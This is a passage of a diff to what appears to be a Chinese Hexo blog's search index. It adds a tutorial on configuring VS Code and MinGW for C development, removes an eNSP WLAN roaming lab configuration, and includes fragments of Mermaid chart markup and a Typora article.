.active2,#mermaidChart0 .active3{fill:#bfc7ff;stroke:#534fbc;}#mermaidChart0 .activeText0,#mermaidChart0 .activeText1,#mermaidChart0 .activeText2,#mermaidChart0 .activeText3{fill:black !important;}#mermaidChart0 .done0,#mermaidChart0 .done1,#mermaidChart0 .done2,#mermaidChart0 .done3{stroke:grey;fill:lightgrey;stroke-width:2;}#mermaidChart0 .doneText0,#mermaidChart0 .doneText1,#mermaidChart0 .doneText2,#mermaidChart0 .doneText3{fill:black !important;}#mermaidChart0 .crit0,#mermaidChart0 .crit1,#mermaidChart0 .crit2,#mermaidChart0 .crit3{stroke:#ff8888;fill:red;stroke-width:2;}#mermaidChart0 .activeCrit0,#mermaidChart0 .activeCrit1,#mermaidChart0 .activeCrit2,#mermaidChart0 .activeCrit3{stroke:#ff8888;fill:#bfc7ff;stroke-width:2;}#mermaidChart0 .doneCrit0,#mermaidChart0 .doneCrit1,#mermaidChart0 .doneCrit2,#mermaidChart0 .doneCrit3{stroke:#ff8888;fill:lightgrey;stroke-width:2;cursor:pointer;shape-rendering:crispEdges;}#mermaidChart0 .milestone{-webkit-transform:rotate(45deg) scale(0.8,0.8);-ms-transform:rotate(45deg) scale(0.8,0.8);transform:rotate(45deg) scale(0.8,0.8);}#mermaidChart0 .milestoneText{font-style:italic;}#mermaidChart0 .doneCritText0,#mermaidChart0 .doneCritText1,#mermaidChart0 .doneCritText2,#mermaidChart0 .doneCritText3{fill:black !important;}#mermaidChart0 .activeCritText0,#mermaidChart0 .activeCritText1,#mermaidChart0 .activeCritText2,#mermaidChart0 .activeCritText3{fill:black !important;}#mermaidChart0 .titleText{text-anchor:middle;font-size:18px;fill:var(–text-color);font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0:root{–mermaid-font-family:sans-serif;}#mermaidChart0:root{–mermaid-alt-font-family:sans-serif;}#mermaidChart0 gantt{fill:apa;}</style><g></g><g class="grid" transform="translate(75, 290)" fill="none" font-size="10" font-family="sans-serif" text-anchor="middle"><path class="domain" stroke="currentColor" d="M0.5,-255V0.5H529.5V-255"></path><g class="tick" opacity="1" transform="translate(33.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-07</text></g><g class="tick" opacity="1" transform="translate(99.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-09</text></g><g class="tick" opacity="1" transform="translate(165.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-11</text></g><g class="tick" opacity="1" transform="translate(231.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-13</text></g><g class="tick" opacity="1" transform="translate(298.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-15</text></g><g class="tick" opacity="1" transform="translate(364.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-17</text></g><g class="tick" opacity="1" transform="translate(430.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-19</text></g><g class="tick" opacity="1" transform="translate(496.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-21</text></g></g><g><rect x="0" y="48" width="614" height="24" class="section section0"></rect><rect x="0" y="144" width="614" height="24" class="section section1"></rect><rect x="0" y="72" width="614" height="24" class="section section0"></rect><rect x="0" y="168" width="614" height="24" class="section section1"></rect><rect x="0" y="192" width="614" height="24" class="section section1"></rect><rect x="0" y="96" width="614" height="24" class="section section0"></rect><rect x="0" y="216" width="614" height="24" class="section section1"></rect><rect x="0" y="120" width="614" height="24" class="section section0"></rect><rect x="0" y="240" width="614" height="24" class="section section1"></rect><rect x="0" y="264" width="614" height="24" class="section section1"></rect></g><g><rect id="des1" rx="3" ry="3" x="75" y="50" width="99" height="20" transform-origin="124.5px 60px" class="task done0 "></rect><rect id="task1" rx="3" ry="3" x="75" y="146" width="99" height="20" transform-origin="124.5px 84px" class="task doneCrit1 "></rect><rect id="des2" rx="3" ry="3" x="174" y="74" width="99" height="20" transform-origin="223.5px 108px" class="task active0 "></rect><rect id="task2" rx="3" ry="3" x="174" y="170" width="66" height="20" transform-origin="207px 132px" class="task doneCrit1 "></rect><rect id="task3" rx="3" ry="3" x="240" y="194" width="100" height="20" transform-origin="290px 156px" class="task activeCrit1 "></rect><rect id="des3" rx="3" ry="3" x="273" y="98" width="166" height="20" transform-origin="356px 180px" class="task task0 "></rect><rect id="task4" rx="3" ry="3" x="340" y="218" width="132" height="20" transform-origin="406px 204px" class="task crit1 "></rect><rect id="des4" rx="3" ry="3" x="439" y="122" width="132" height="20" transform-origin="505px 228px" class="task task0 "></rect><rect id="task5" rx="3" ry="3" x="472" y="242" width="66" height="20" transform-origin="505px 252px" class="task task1 "></rect><rect id="task6" rx="3" ry="3" x="538" y="266" width="66" height="20" transform-origin="571px 276px" class="task task1 "></rect><text id="des1-text" font-size="11" x="124.5" y="63.5" text-height="20" class=" taskText taskText0  doneText0 width-21.515625">学习            </text><text id="task1-text" font-size="11" x="124.5" y="159.5" text-height="20" class=" taskText taskText1  doneCritText1 width-57.8125">学习Python </text><text id="des2-text" font-size="11" x="223.5" y="87.5" text-height="20" class=" taskText taskText0 activeText0 width-43.015625">疯狂学习               </text><text id="task2-text" font-size="11" x="207" y="183.5" text-height="20" class=" taskText taskText1  doneCritText1 width-45.03125">学习C++          </text><text id="task3-text" font-size="11" x="290" y="207.5" text-height="20" class=" taskText taskText1 activeCritText1 critText1 width-41">学习Lisp             </text><text id="des3-text" font-size="11" x="356" y="111.5" text-height="20" class=" taskText taskText0  width-64.53125">继续疯狂学习               </text><text id="task4-text" font-size="11" x="406" y="231.5" text-height="20" class=" taskText taskText1  critText1 width-53.78125">学习图形学        </text><text id="des4-text" font-size="11" x="505" y="135.5" text-height="20" class=" taskText taskText0  width-32.265625">吃鸡！               </text><text id="task5-text" font-size="11" x="505" y="255.5" text-height="20" class=" taskText taskText1  width-21.515625">跳伞           </text><text id="task6-text" font-size="11" x="571" y="279.5" text-height="20" class=" taskText taskText1  width-21.515625">打枪                      </text></g><g><text dy="0em" x="10" y="98" class="sectionTitle sectionTitle0"><tspan alignment-baseline="central" x="10">吃一把鸡就学习</tspan></text><text dy="0em" x="10" y="218" class="sectionTitle sectionTitle1"><tspan alignment-baseline="central" x="10">具体内容</tspan></text></g><g class="today"><line x1="100579" x2="100579" y1="25" y2="315" class="today"></line></g><text x="312" y="25" class="titleText">快乐的生活</text></svg></p>
+<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>您可以使用HTML来设置纯 Markdown 不支持的内容，例如， <code>&lt;span style=&quot;color:red&quot;&gt;this text is red&lt;/span&gt;</code> 用于添加红色文本。</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VLAN原理及VLAN间通信</title>
     <url>/posts/ad13b3a0/</url>
     <content><![CDATA[<div class="danger">
@@ -4907,6 +5220,174 @@ VLAN Name 		Status 		Ports
       </tags>
   </entry>
   <entry>
+    <title>VS Code C语言开发环境配置</title>
+    <url>/posts/bfe43f2e/</url>
+    <content><![CDATA[<h2 id="安装VS-code"><a href="#安装VS-code" class="headerlink" title="安装VS code"></a>安装VS code</h2><p>VS code：<a href="https://code.visualstudio.com/">https://code.visualstudio.com</a></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103908.png" alt="1" loading="lazy"></p>
+<p>下载完成后双击安装</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103906.png" alt="2" loading="lazy"></p>
+<p>安装完成后，打开VS Code，在安装插件栏搜索chinese，找到简体中文版本，点击install，安装结束后重启应用完成汉化</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103914.png" alt="3" loading="lazy"></p>
+<h2 id="安装用于C-x2F-C-的插件"><a href="#安装用于C-x2F-C-的插件" class="headerlink" title="安装用于C&#x2F;C++的插件"></a>安装用于C&#x2F;C++的插件</h2><p>插件栏搜索Code Runner，点击安装</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103918.png" alt="4" loading="lazy"></p>
+<p>安装完成后在扩展设置中勾选<code>Ignore Selection</code>、<code>Run In Terminal</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103923.png" alt="5" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103926.png" alt="6" loading="lazy"></p>
+<p>插件栏搜索C&#x2F;C++,点击安装</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103930.png" alt="7" loading="lazy"></p>
+<h2 id="安装编译器MinGW-W64-GCC"><a href="#安装编译器MinGW-W64-GCC" class="headerlink" title="安装编译器MinGW-W64 GCC"></a>安装编译器MinGW-W64 GCC</h2><p>MinGW-W64 GCC：<a href="https://sourceforge.net/projects/mingw-w64">https://sourceforge.net/projects/mingw-w64</a></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103935.png" alt="8" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103938.png" alt="9" loading="lazy"></p>
+<p>下载完成后解压文件</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103941.png" alt="10" loading="lazy"></p>
+<p>在D盘新建文件夹（英文命名就行，中文总会有莫名其妙的问题），之后将解压的文件移动到刚刚新建的文件夹中</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103947.png" alt="11" loading="lazy"></p>
+<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>打开mingw64，点开bin，将bin所在地址复制下来</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103951.png" alt="12" loading="lazy"></p>
+<p>打开设置，依次点击<code>系统</code>–<code>关于</code>–<code>高级系统设置</code>–<code>环境变量</code> 在<code>Administrator的用户变量</code>中编辑<code>Path</code>变量，点击空白处，将复制好的地址粘贴进去，点击确定</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103955.png" alt="13" loading="lazy"></p>
+<p>同样的步骤，在文件夹中找到inlude，点开，复制地址，粘贴到Path中</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103959.png" alt="14" loading="lazy"></p>
+<p>依次点击确定关闭窗口</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104003.png" alt="15" loading="lazy"></p>
+<p>完成后按下win+r，输入cmd，点击确定</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104008.png" alt="16" loading="lazy"></p>
+<p>弹出黑框后输入</p>
+<pre class="language-none"><code class="language-none">gcc -v -E -x c++ -</code></pre>
+
+
+<p>若显示结果如图 则配置成功</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104013.png" alt="17" loading="lazy"></p>
+<h2 id="配置三个文件-c-cpp-propertise-json、launch-json、tasks-json"><a href="#配置三个文件-c-cpp-propertise-json、launch-json、tasks-json" class="headerlink" title="配置三个文件 c_cpp_propertise.json、launch.json、tasks.json"></a>配置三个文件 c_cpp_propertise.json、launch.json、tasks.json</h2><p>先在电脑上新建一个文件夹（像我就是在我的电脑上新建一个叫<code>C--</code>的文件夹），打开它</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104018.png" alt="18" loading="lazy"></p>
+<p>之后新建三个文件，名字是<code>c_cpp_propertise.json</code>、 <code>launch.json</code>、 <code>tasks.json</code>，如图</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104021.png" alt="19" loading="lazy"></p>
+<p>接下来把相应内容写进去</p>
+<p>c_cpp_propertise.json</p>
+<blockquote>
+<p>在这个代码中，我们需要把地址改成自己的mingw 64 bin的地址</p>
+</blockquote>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   
+    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>       
+     <span class="token punctuation">&#123;</span>          
+         <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Win32"</span><span class="token punctuation">,</span>       
+         <span class="token property">"includePath"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+         <span class="token string">"$&#123;workspaceRoot&#125;"</span><span class="token punctuation">,</span>               
+         <span class="token string">"D:/C/mingw64/include/**"</span><span class="token punctuation">,</span>               
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/include"</span>
+    <span class="token punctuation">]</span><span class="token punctuation">,</span>      
+    <span class="token property">"defines"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+        <span class="token string">"_DEBUG"</span><span class="token punctuation">,</span>               
+        <span class="token string">"UNICODE"</span><span class="token punctuation">,</span>
+        <span class="token string">"__GNUC__=6"</span><span class="token punctuation">,</span>               
+        <span class="token string">"__cdecl=__attribute__((__cdecl__))"</span>            
+        <span class="token punctuation">]</span><span class="token punctuation">,</span>           
+    <span class="token property">"intelliSenseMode"</span><span class="token operator">:</span> <span class="token string">"msvc-x64"</span><span class="token punctuation">,</span>
+    <span class="token property">"browse"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              
+        <span class="token property">"limitSymbolsToIncludedHeaders"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+        <span class="token property">"databaseFilename"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                   
+            <span class="token string">"$&#123;workspaceRoot&#125;"</span><span class="token punctuation">,</span>                   
+            <span class="token string">"D:/C/mingw64/include/**"</span><span class="token punctuation">,</span>                   
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/include"</span>
+           <span class="token punctuation">]</span>        
+        <span class="token punctuation">&#125;</span>       
+     <span class="token punctuation">&#125;</span>   
+  <span class="token punctuation">]</span><span class="token punctuation">,</span>   
+   <span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">4</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104027.png" alt="20" loading="lazy"></p>
+<p>launch.json</p>
+<blockquote>
+<p>在这个代码中，我们需要把地址改成自己的mingw 64 bin的地址</p>
+</blockquote>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  
+    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>
+    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>     
+        <span class="token punctuation">&#123;</span>           
+            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"(gdb) Launch"</span><span class="token punctuation">,</span> <span class="token comment">// 配置名称，将会在启动配置的下拉菜单中显示            </span>
+            <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"cppdbg"</span><span class="token punctuation">,</span> <span class="token comment">// 配置类型，这里只能为cppdbg           </span>
+            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span> <span class="token comment">//请求配置类型，可以为launch（启动）或attach（附加）          </span>
+            <span class="token property">"program"</span><span class="token operator">:</span><span class="token string">"$&#123;workspaceFolder&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span><span class="token punctuation">,</span> <span class="token comment">// 将要进行调试的程序的路径</span>
+            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 程序调试时传递给程序的命令行参数，一般设为空即可            </span>
+            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 设为true时程序将暂停在程序入口处，一般设置为false            </span>
+            <span class="token property">"cwd"</span><span class="token operator">:</span><span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span> <span class="token comment">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录workspaceRoot已被弃用，现改为workspaceFolder            </span>
+            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
+            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台           </span>
+            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            
+            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span><span class="token string">"D:/C/mingw64/bin/gdb.exe"</span><span class="token punctuation">,</span> <span class="token comment">// miDebugger的路径，注意这里要与MinGw的路径对应  </span>
+            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token comment">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc      </span>
+            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>     
+                <span class="token punctuation">&#123;</span>                   
+                    <span class="token property">"description"</span><span class="token operator">:</span>     <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                   
+                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                   
+                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">false</span>  
+                  <span class="token punctuation">&#125;</span>        
+               <span class="token punctuation">]</span>     
+            <span class="token punctuation">&#125;</span>  
+         <span class="token punctuation">]</span>
+      <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104033.png" alt="21" loading="lazy"></p>
+<p>tasks.json</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   
+     <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>   
+     <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token comment">// 注意对应  </span>
+     <span class="token property">"args"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span><span class="token string">"-o"</span><span class="token punctuation">,</span><span class="token string">"$&#123;fileBasenameNoExtension&#125;.exe"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment">// 编译命令参数</span>
+     <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>       
+         <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>
+         <span class="token property">"fileLocation"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"relative"</span><span class="token punctuation">,</span><span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        
+         <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+         <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>
+         <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>         
+         <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>         
+         <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>           
+         <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>            
+         <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>       
+         <span class="token punctuation">&#125;</span>  
+      <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+
+
+<h2 id="重启与调试"><a href="#重启与调试" class="headerlink" title="重启与调试"></a>重启与调试</h2><p>重启vscode，在文件夹C–上新建一个以.c结尾的文件<br>这里我们简单编写一个C语言的程序，设置断点并调试</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104037.png" alt="22" loading="lazy"></p>
+<p>完成</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VScode简单配置</title>
     <url>/posts/83ecd2a4/</url>
     <content><![CDATA[<h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>点击左侧工具栏的extensions或者使用快捷键【Ctrl+Shift+X】，输入chinese，点击Install安装中文简体</p>
@@ -4929,194 +5410,6 @@ VLAN Name 		Status 		Ports
       </categories>
       <tags>
         <tag>其他</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WLAN漫游</title>
-    <url>/posts/ba6ef991/</url>
-    <content><![CDATA[<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145903.png" alt="image-20220615145902818" loading="lazy"></p>
-<h2 id="配置如下："><a href="#配置如下：" class="headerlink" title="配置如下："></a>配置如下：</h2><h3 id="路由器的配置："><a href="#路由器的配置：" class="headerlink" title="路由器的配置："></a>路由器的配置：</h3><pre class="language-none"><code class="language-none">sys
-sysname LuRen-SW
-int g0&#x2F;0&#x2F;0
-ip add 10.1.1.2 30
-int lo0
-ip add 1.1.1.1 32
-ospf 1
-area 0.0.0.0
-network 1.1.1.1 0.0.0.0
-network 10.1.1.0 0.0.0.3
-</code></pre>
-
-
-
-
-
-<h3 id="交换机配置"><a href="#交换机配置" class="headerlink" title="交换机配置"></a>交换机配置</h3><pre class="language-none"><code class="language-none">undo terminal monitor 
-sys
-LuRen-SW
-vlan batch 10 100
-int g0&#x2F;0&#x2F;1
-port link-type trunk
-port trunk allow-pass vlan 10 100
-int g0&#x2F;0&#x2F;2
-port link-type trunk
-port trunk pvid vlan 10
-port trunk allow-pass vlan 10 100
-int g0&#x2F;0&#x2F;3
-port link-type trunk
-port trunk pvid vlan 10
-port trunk allow-pass vlan 10 100
-</code></pre>
-
-
-
-<h3 id="AC的配置"><a href="#AC的配置" class="headerlink" title="AC的配置"></a>AC的配置</h3><pre class="language-none"><code class="language-none">sys
-sysname LuRen-AC
-vlan batch 12 10 100
-int g0&#x2F;0&#x2F;1
-port link-type access
-port default vlan 12
-int g0&#x2F;0&#x2F;2
-port link-type trunk
-port trunk allow-pass vlan 10 100
-int vlan 10
-ip add 172.16.1.1 24
-dhcp enable
-int vlan 10
-dhcp select interface
-int vlan 12
-ip add 10.1.1.1 30
-int vlan 100
-ip add 172.16.100.1 24
-dhcp select interface
-quit
-capwap source interface vlan 10
-wlan
-ap whitelist mac 00e0-fcc7-7640
-ap whitelist mac 00e0-fc53-2e60
-security-profile name LuRen	
-security wpa-wpa2 psk pass-phrase 12345678 aes
-
-
-
-
-quit
-ssid-profile name LuRen-ssid
-ssid LuRen
-quit
-regulatory-domain-profile name LuRen-domain
-country-code cn
-quit
-vap-profile name LuRen-vap
-forward-mode tunnel
-service-vlan vlan-id 100
-ssid-profile LuRen-ssid
-
-security-profile LuRen
-
-
-quit
-rrm-profile name LuRen-rrm
-smart-roam enable
-smart-roam roam-threshold check-snr check-rate 
-smart-roam roam-threshold snr 30
-smart-roam roam-threshold rate 30
-quit
-radio-2g-profile name LuRen-2g
-
-
-
-rrm-profile LuRen-rrm
-quit
-radio-5g-profile name LuRen-5g
-rrm-profile LuRen-rrm
-quit
-ap-group name ap
-radio 0
-radio-2g-profile LuRen-2g
-vap-profile LuRen-vap wlan 1
-quit
-radio 1	
-radio-5g-profile LuRen-5g
-
-
-vap-profile LuRen-vap wlan 1
-quit
-quit
-ap-id 0
-ap-group ap
-ap-id 1
-ap-group ap
-</code></pre>
-
-<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>验证AP上线</p>
-<pre class="language-none"><code class="language-none">[LuRen-AC]dis ap all
-Info: This operation may take a few seconds. Please wait for a moment.done.
-Total AP information:
-nor  : normal          [2]
--------------------------------------------------------------------------------------------------
-ID   MAC            Name           Group IP           Type            State STA 
-Uptime
--------------------------------------------------------------------------------------------------
-0    00e0-fc04-7ed0 00e0-fc04-7ed0 ap 172.16.1.133 AP3030DN nor   0 5M:45S
-1    00e0-fc47-3a80 00e0-fc47-3a80 ap 172.16.1.40 AP3030DN  nor   0 5M:36S
--------------------------------------------------------------------------------------------------
-Total: 2
-</code></pre>
-
-
-
-
-
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="路由器的配置：-1"><a href="#路由器的配置：-1" class="headerlink" title="路由器的配置："></a>路由器的配置：</h3><pre class="language-none"><code class="language-none">sysname LuRen-R0
-int g0&#x2F;0&#x2F;0
-ip add 10.1.1.2 30
-int lo0
-ip add 1.1.1.1 32
-ospf 1
-area 0.0.0.0
-network 1.1.1.1 0.0.0.0
-network 10.1.1.0 0.0.0.3
-</code></pre>
-
-
-
-<h3 id="交换机配置-1"><a href="#交换机配置-1" class="headerlink" title="交换机配置"></a>交换机配置</h3><pre class="language-none"><code class="language-none">undo terminal monitor 
-sys
-sys LuRen-SW
-vlan batch 10 100
-int g0&#x2F;0&#x2F;1
-port link-type trunk
-port trunk allow-pass vlan 10 100
-int g0&#x2F;0&#x2F;2
-port link-type trunk
-port trunk pvid vlan 10
-port trunk allow-pass vlan 10 100
-int g0&#x2F;0&#x2F;3
-port link-type trunk
-port trunk pvid vlan 10
-port trunk allow-pass vlan 10 100
-</code></pre>
-
-
-
-<h3 id="AC的配置-1"><a href="#AC的配置-1" class="headerlink" title="AC的配置"></a>AC的配置</h3><pre class="language-none"><code class="language-none">sys
-sysname LuRen-AC
-int vlan 1
-ip add 192.168.200.100 24
-quit
-http server enable
-</code></pre>
-
-<h3 id="Web登录"><a href="#Web登录" class="headerlink" title="Web登录"></a>Web登录</h3><pre class="language-none"><code class="language-none">略</code></pre>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>eNSP</category>
-        <category>WLAN和安全</category>
-      </categories>
-      <tags>
-        <tag>eNSP</tag>
       </tags>
   </entry>
   <entry>
@@ -5513,316 +5806,191 @@ http server enable
       </tags>
   </entry>
   <entry>
-    <title>Typora基本用法</title>
-    <url>/posts/1bd41834/</url>
-    <content><![CDATA[<p>[toc]</p>
-<h2 id="Typore简介"><a href="#Typore简介" class="headerlink" title="Typore简介"></a>Typore简介</h2><p>Typora是一款轻便简洁的Markdown编辑器，支持即时渲染技术，这也是与其他Markdown编辑器最显著的区别。即时渲染使得你写Markdown就想是写Word文档一样流畅自如，不像其他编辑器的有编辑栏和显示栏。</p>
